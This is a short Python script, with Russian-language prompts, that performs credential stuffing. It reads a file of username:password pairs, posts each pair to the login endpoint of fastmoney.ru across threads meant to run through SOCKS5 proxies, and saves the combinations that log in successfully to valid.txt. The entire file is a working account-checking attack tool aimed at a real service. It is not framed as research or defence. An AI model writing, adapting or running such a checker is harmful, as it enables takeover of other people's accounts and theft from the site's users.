import requests, re, threading, time

proxies = {}
prox = ''

def checker(dir_, l, k):
    file = open(dir_).read().split('\n')
    for account in file[(len(file) // k) * l: (len(file) // k) * l + (len(file) // k)]:
        try:
            b = account.split(':')
            data = {}
            data['name'] = b[0]
            data['password'] = b[1]
            s = requests.Session()
            resp = s.post('https://www.fastmoney.ru/auth/login', json=data)
            print(data)
            print(resp.text)
            if '"success":true' in resp.text:
                output = open('valid.txt', 'a', encoding='utf-8')
                output.write(account + '\n')
                output.close()
                print('**' + data['name'] + '**' + data['password'] + '** VALID')
            else:
                print('**' + data['name'] + '**' + data['password'] + '** NEVALID')
            time.sleep(0)
        except Exception as ex:
            #print(ex)
            print('Неправильная строка')
    print('Проверка завершена. Полученные аккаунты в файле valid.txt')

def main():
    q = str(input('Перетащи сюда базу для проверки: '))
    if '.txt' in q:
        dir_ = q
    else:
        dir_ = q + '.txt'

    for i in range(0, len(prox.split('\n'))):
        proxies[i] = {'http': 'socks5://' + prox.split('\n')[i], 'https': "socks5://" + prox.split('\n')[i]}
        threading.Thread(target=checker, args=(dir_, i, len(prox.split('\n')))).start()

    print(proxies)


main()